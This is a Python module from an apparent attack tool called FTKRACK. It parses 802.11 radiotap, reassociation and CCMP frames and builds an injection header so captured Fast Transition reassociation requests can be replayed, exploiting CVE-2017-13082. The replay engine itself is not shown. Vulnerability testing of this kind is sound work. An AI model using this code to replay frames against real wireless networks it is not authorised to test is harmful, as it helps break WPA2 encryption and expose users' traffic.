"""802.11 / radiotap parsing and frame building for FTKRACK.

Pure Python standard library.  No Scapy, no external modules.

Coverage is deliberately narrow -- exactly the frames CVE-2017-13082 needs:

  * radiotap capture headers (skip to the 802.11 frame, read channel/RSSI)
  * a minimal radiotap header for replay from a monitor interface
  * 802.11 management frames: Reassociation Request (subtype 2) and
    Reassociation Response (subtype 3)
  * Information Elements, specifically MDIE (54) and FTIE (55)
  * 802.11 data frames with an 8-byte CCMP header (PN extraction)

Honesty notes
-------------
* This module only decodes bytes.  It never decides that an attack worked.
  Success is a separate, evidence-gated decision in engine.py.
* FTIE validation is structural: the MIC is *not* recomputed (the PTK is not
  known to a passive observer).  A captured frame is replayed byte-for-byte,
  so its original MIC is preserved.  A structurally valid FTIE is therefore
  the strongest claim a passive capture can make before the AP answers.
"""

from __future__ import annotations

import struct
from typing import Optional

# ---------------------------------------------------------------------------
# Radiotap
# ---------------------------------------------------------------------------

# Present-bit numbers from the radiotap specification.
RT_TSFT = 0
RT_FLAGS = 1
RT_RATE = 2
RT_CHANNEL = 3
RT_FHSS = 4
RT_DBM_SIGNAL = 5
RT_DBM_NOISE = 6
RT_LOCK_QUALITY = 7
RT_TX_ATTENUATION = 8
RT_DBM_TX_ATTENUATION = 9
RT_TX_POWER = 10
RT_TX_FLAGS = 11
RT_RX_FLAGS = 12

# Present bit 11 -> 0x00000800 in the first (little-endian) present word.
RT_PRESENT_TX_FLAGS = 1 << RT_TX_FLAGS

# Radiotap TX_FLAGS bit 0x0008 is IEEE80211_RADIOTAP_F_TX_NOACK, NOT
# "injected".  Linux sets its internal IEEE80211_TX_CTL_INJECTED flag itself
# for frames received from a monitor interface; userspace must not request it.
# We therefore emit a minimal radiotap header with no present fields at all.
RADIOTAP_F_TX_NOACK = 0x0008

# (alignment, size) for the radiotap fields we can walk safely.  Fields not in
# this table stop the walk; everything before them is still reported.
_RT_FIELD_LAYOUT = {
    RT_TSFT: (8, 8),
    RT_FLAGS: (1, 1),
    RT_RATE: (1, 1),
    RT_CHANNEL: (2, 4),
    RT_FHSS: (2, 2),
    RT_DBM_SIGNAL: (1, 1),
    RT_DBM_NOISE: (1, 1),
    RT_LOCK_QUALITY: (2, 2),
    RT_TX_ATTENUATION: (2, 2),
    RT_DBM_TX_ATTENUATION: (2, 2),
    RT_TX_POWER: (1, 1),
    RT_TX_FLAGS: (2, 2),
    RT_RX_FLAGS: (2, 2),
}


def parse_radiotap(buf: bytes) -> Optional[dict]:
    """Return radiotap metadata, or None for a malformed/unsupported header."""
    if len(buf) < 8 or buf[0] != 0:
        return None
    length = struct.unpack_from("<H", buf, 2)[0]
    if length < 8 or length > len(buf):
        return None

    present: list[int] = []
    off = 4
    word = struct.unpack_from("<I", buf, off)[0]
    present.append(word)
    while word & 0x80000000 and off + 8 <= length:
        off += 4
        word = struct.unpack_from("<I", buf, off)[0]
        present.append(word)
    fields_at = off + 4

    info = {
        "version": buf[0],
        "length": length,
        "present": present,
        "channel_hz": 0,
        "signal_dbm": None,
        "tx_flags": 0,
    }

    pos = fields_at
    bit = 0
    for word in present:
        for i in range(32):
            if not (word >> i) & 1:
                continue
            idx = bit + i
            layout = _RT_FIELD_LAYOUT.get(idx)
            if layout is None:
                return info  # unknown field: keep what we already decoded
            align, size = layout
            pad = (-pos) % align
            pos += pad
            if pos + size > length:
                return info
            if idx == RT_CHANNEL:
                # Radiotap stores frequency in MHz in a 16-bit field.
                freq, _flags = struct.unpack_from("<HH", buf, pos)
                info["channel_hz"] = int(freq) * 1_000_000
            elif idx == RT_DBM_SIGNAL:
                val = buf[pos]
                info["signal_dbm"] = val - 256 if val > 127 else val
            elif idx == RT_TX_FLAGS:
                info["tx_flags"] = struct.unpack_from("<H", buf, pos)[0]
            pos += size
        bit += 32
    return info


def strip_radiotap(buf: bytes) -> tuple[Optional[bytes], Optional[dict]]:
    """Split a captured buffer into (802.11 frame, radiotap metadata)."""
    rt = parse_radiotap(buf)
    if rt is None:
        return None, None
    return buf[rt["length"]:], rt


def build_radiotap_inject() -> bytes:
    """Minimal radiotap header for injecting a frame from a monitor interface.

    version 0, it_len 8, present bitmap 0: no optional fields.  mac80211 marks
    frames arriving from a monitor interface as injected automatically.  We
    deliberately do NOT set radiotap TX_FLAGS bit 0x0008 -- that is NOACK,
    which would suppress the ACK we actually want for the replayed frame.
    """
    return b"\x00\x00\x08\x00\x00\x00\x00\x00"


# ---------------------------------------------------------------------------
# 802.11 common
# ---------------------------------------------------------------------------

MGT_REASSOC_REQ = 2
MGT_REASSOC_RESP = 3
TYPE_MGT = 0
TYPE_DATA = 2

IE_MDIE = 54
IE_FTIE = 55


def mac(buf: bytes) -> str:
    return ":".join(f"{b:02x}" for b in buf[:6])


def parse_mac(text: str) -> Optional[bytes]:
    try:
        parts = str(text).replace("-", ":").split(":")
        if len(parts) != 6:
            return None
        return bytes(int(p, 16) & 0xFF for p in parts)
    except (TypeError, ValueError):
        return None


class Dot11Frame:
    __slots__ = (
        "raw", "frame_control", "ftype", "subtype", "to_ds", "from_ds",
        "retry", "protected", "order", "addr1", "addr2", "addr3",
        "seq_ctrl", "header_len", "body",
    )

    def __init__(self, raw: bytes, frame_control: int, ftype: int, subtype: int,
                 to_ds: int, from_ds: int, retry: int, protected: int,
                 order: int, addr1: bytes, addr2: bytes, addr3: bytes,
                 seq_ctrl: int, header_len: int, body: bytes):
        self.raw = raw
        self.frame_control = frame_control
        self.ftype = ftype
        self.subtype = subtype
        self.to_ds = to_ds
        self.from_ds = from_ds
        self.retry = retry
        self.protected = protected
        self.order = order
        self.addr1 = addr1
        self.addr2 = addr2
        self.addr3 = addr3
        self.seq_ctrl = seq_ctrl
        self.header_len = header_len
        self.body = body

    @property
    def transmitter(self) -> bytes:
        """Best-effort transmitter address (addr2 in the 3-address case)."""
        return self.addr2


def parse_dot11(buf: bytes) -> Optional[Dot11Frame]:
    if len(buf) < 24:
        return None
    fc = struct.unpack_from("<H", buf, 0)[0]
    ftype = (fc >> 2) & 0x3
    subtype = (fc >> 4) & 0xF
    to_ds = (fc >> 8) & 1
    from_ds = (fc >> 9) & 1
    retry = (fc >> 11) & 1
    protected = (fc >> 14) & 1
    order = (fc >> 15) & 1

    header_len = 24
    if ftype == TYPE_DATA:
        if to_ds and from_ds:
            header_len += 6          # 4-address data frame
        if subtype & 0x08:
            header_len += 2          # QoS Control
    if len(buf) < header_len:
        return None

    return Dot11Frame(
        raw=buf, frame_control=fc, ftype=ftype, subtype=subtype,
        to_ds=to_ds, from_ds=from_ds, retry=retry, protected=protected,
        order=order, addr1=bytes(buf[4:10]), addr2=bytes(buf[10:16]),
        addr3=bytes(buf[16:22]),
        seq_ctrl=struct.unpack_from("<H", buf, 22)[0],
        header_len=header_len, body=bytes(buf[header_len:]),
    )


def parse_ies(body: bytes, start: int = 0) -> dict[int, list[bytes]]:
    ies: dict[int, list[bytes]] = {}
    off = start
    while off + 2 <= len(body):
        eid = body[off]
        elen = body[off + 1]
        if off + 2 + elen > len(body):
            break
        ies.setdefault(eid, []).append(bytes(body[off + 2:off + 2 + elen]))
        off += 2 + elen
    return ies


# ---------------------------------------------------------------------------
# 802.11r Fast Transition elements
# ---------------------------------------------------------------------------

def parse_mdie(value: bytes) -> Optional[dict]:
    """Mobility Domain IE (ID 54): MDID (2), FT capability/policy (1)."""
    if len(value) < 3:
        return None
    return {
        "mdid": struct.unpack_from("<H", value, 0)[0],
        "ft_capability": value[2],
        "raw": bytes(value),
    }


def parse_ftie(value: bytes) -> Optional[dict]:
    """FT IE (ID 55): MIC Control (2), MIC (16), SNonce (32), ANonce (32)."""
    if len(value) < 82:
        return None
    return {
        "mic_control": struct.unpack_from("<H", value, 0)[0],
        "mic": bytes(value[2:18]),
        "snonce": bytes(value[18:50]),
        "anonce": bytes(value[50:82]),
        "subelements": bytes(value[82:]),
        "raw": bytes(value),
    }


def ftie_is_structurally_valid(ftie: Optional[dict]) -> bool:
    if not ftie:
        return False
    return (any(ftie["mic"]) and any(ftie["snonce"]) and any(ftie["anonce"]))


# ---------------------------------------------------------------------------
# Reassociation Request / Response
# ---------------------------------------------------------------------------

def parse_reassoc_req(frame: Dot11Frame) -> Optional[dict]:
    """Parse an FT Reassociation Request.  Returns None if not one."""
    if frame.ftype != TYPE_MGT or frame.subtype != MGT_REASSOC_REQ:
        return None
    body = frame.body
    if len(body) < 10:                 # capability(2)+listen(2)+current AP(6)
        return None
    capability, listen = struct.unpack_from("<HH", body, 0)
    current_ap = bytes(body[4:10])
    ies = parse_ies(body, 10)
    mdie_values = ies.get(IE_MDIE, [])
    ftie_values = ies.get(IE_FTIE, [])
    mdie = parse_mdie(mdie_values[0]) if mdie_values else None
    ftie = parse_ftie(ftie_values[0]) if ftie_values else None

    ssid = ies.get(0, [b""])[0][:32]
    try:
        ssid_text = ssid.decode("utf-8", "replace")
    except Exception:
        ssid_text = ""

    result = {
        "bssid": mac(frame.addr1),
        "sta": mac(frame.addr2),
        "current_ap": mac(current_ap),
        "capability": capability,
        "listen_interval": listen,
        "ssid": ssid_text,
        "mdie": mdie,
        "ftie": ftie,
        "ft_valid": bool(mdie and ftie_is_structurally_valid(ftie)),
        "seq_ctrl": frame.seq_ctrl,
        "raw": frame.raw,
    }
    return result


def parse_reassoc_resp(frame: Dot11Frame) -> Optional[dict]:
    """Parse a Reassociation Response.  status 0 means success."""
    if frame.ftype != TYPE_MGT or frame.subtype != MGT_REASSOC_RESP:
        return None
    body = frame.body
    if len(body) < 6:
        return None
    capability, status, aid = struct.unpack_from("<HHH", body, 0)
    return {
        "bssid": mac(frame.addr2),
        "sta": mac(frame.addr1),
        "capability": capability,
        "status": status,
        "aid": aid & 0x3FFF,
        "success": status == 0,
        "raw": frame.raw,
    }


# ---------------------------------------------------------------------------
# CCMP packet number
# ---------------------------------------------------------------------------

def ccmp_pn(header: bytes) -> Optional[int]:
    """Extract the 48-bit CCMP PN from an 8-byte CCMP header.

    Byte order follows IEEE 802.11-2016 / Scapy Dot11CCMP: PN0, PN1, res0,
    key-id byte, PN2, PN3, PN4, PN5.  PN is little-endian across those five
    positions.
    """
    if len(header) < 8:
        return None
    return (header[0] | (header[1] << 8) | (header[4] << 16) |
            (header[5] << 24) | (header[6] << 32) | (header[7] << 40))


def parse_ccmp_data(frame: Dot11Frame) -> Optional[dict]:
    """Return transmitter/PN metadata for a protected CCMP data frame."""
    if frame.ftype != TYPE_DATA or not frame.protected:
        return None
    # Only QoS data (subtype & 0x08) uses the CCMP header in practice; accept
    # any protected data frame with a full 8-byte header after the 802.11 MAC.
    pos = frame.header_len
    if len(frame.raw) < pos + 8:
        return None
    pn = ccmp_pn(frame.raw[pos:pos + 8])
    if pn is None:
        return None
    qos = bool(frame.subtype & 0x08)
    tid = -1
    if qos:
        # QoS Control is the last two bytes of the 802.11 MAC header; the
        # low nibble of its first byte is the traffic identifier.
        tid = frame.raw[frame.header_len - 2] & 0x0F
    return {
        "transmitter": mac(frame.transmitter),
        "transmitter_raw": frame.transmitter,
        "destination": mac(frame.addr1),
        "addr3": mac(frame.addr3),
        "pn": pn,
        "qos": qos,
        "tid": tid,
        "retry": bool(frame.retry),
        "from_ds": bool(frame.from_ds),
        "seq_ctrl": frame.seq_ctrl,
    }


# ---------------------------------------------------------------------------
# Builders (used by selftest, vectors and hardware-free tests)
# ---------------------------------------------------------------------------

def build_reassoc_req(bssid: bytes, sta: bytes, current_ap: bytes,
                      ssid: str, mdid: int = 0x1234,
                      snonce: Optional[bytes] = None,
                      anonce: Optional[bytes] = None,
                      mic: Optional[bytes] = None) -> bytes:
    snonce = snonce or bytes(range(0x10, 0x30))
    anonce = anonce or bytes(range(0x30, 0x50))
    mic = mic or bytes(range(0x01, 0x11))

    ftie = (struct.pack("<H", 0x0000) + mic + snonce + anonce)
    mdie = struct.pack("<HB", mdid, 0x03)  # MDID(2) + FT Capability/Policy(1)
    ssid_bytes = ssid.encode("utf-8", "replace")[:32]

    body = (struct.pack("<HH", 0x0411, 0) + current_ap +
            bytes([0, len(ssid_bytes)]) + ssid_bytes +
            bytes([IE_MDIE, len(mdie)]) + mdie +
            bytes([IE_FTIE, len(ftie)]) + ftie)

    fc = (TYPE_MGT << 2) | (MGT_REASSOC_REQ << 4)
    header = struct.pack("<HH6s6s6sH", fc, 0, bssid, sta, bssid, 0)
    return header + body


def build_reassoc_resp(bssid: bytes, sta: bytes, status: int = 0,
                       aid: int = 0x0002) -> bytes:
    body = struct.pack("<HHH", 0x0411, status & 0xFFFF, aid & 0x3FFF)
    fc = (TYPE_MGT << 2) | (MGT_REASSOC_RESP << 4)
    header = struct.pack("<HH6s6s6sH", fc, 0, sta, bssid, bssid, 0)
    return header + body


def build_ccmp_data(transmitter: bytes, destination: bytes, source: bytes,
                    pn: int, tid: int = 0, retry: bool = False,
                    payload: bytes = b"\xaa\xaa\x03\x00\x00\x00") -> bytes:
    pn &= 0xFFFFFFFFFFFF
    ccmp = bytes([
        pn & 0xFF, (pn >> 8) & 0xFF, 0x00, 0x20,
        (pn >> 16) & 0xFF, (pn >> 24) & 0xFF,
        (pn >> 32) & 0xFF, (pn >> 40) & 0xFF,
    ])
    # QoS data, FromDS=1 (AP -> client), protected.  For a FromDS frame addr2
    # is the AP and addr3 is the original source station.
    fc = ((TYPE_DATA << 2) | (0x08 << 4) | (1 << 9) | (1 << 14) |
          ((1 << 11) if retry else 0))
    header = struct.pack("<HH6s6s6sHH", fc, 0, destination, transmitter,
                         source, 0, tid & 0x0F)
    return header + ccmp + payload


def build_capture_buffer(frame: bytes, channel_hz: int = 2412_000_000,
                         signal_dbm: int = -55) -> bytes:
    """Wrap an 802.11 frame in a plausible radiotap capture header."""
    # present = CHANNEL (bit 3) | DBM_SIGNAL (bit 5) = 0x00000028
    present = (1 << RT_CHANNEL) | (1 << RT_DBM_SIGNAL)
    # Fields: Channel aligned 2 at offset 8 (4 bytes), then signal at offset 12.
    header = bytearray(13)
    header[0] = 0
    struct.pack_into("<H", header, 2, 13)
    struct.pack_into("<I", header, 4, present)
    struct.pack_into("<HH", header, 8, (channel_hz // 1_000_000) & 0xFFFF, 0x0000)
    header[12] = signal_dbm & 0xFF
    return bytes(header) + frame
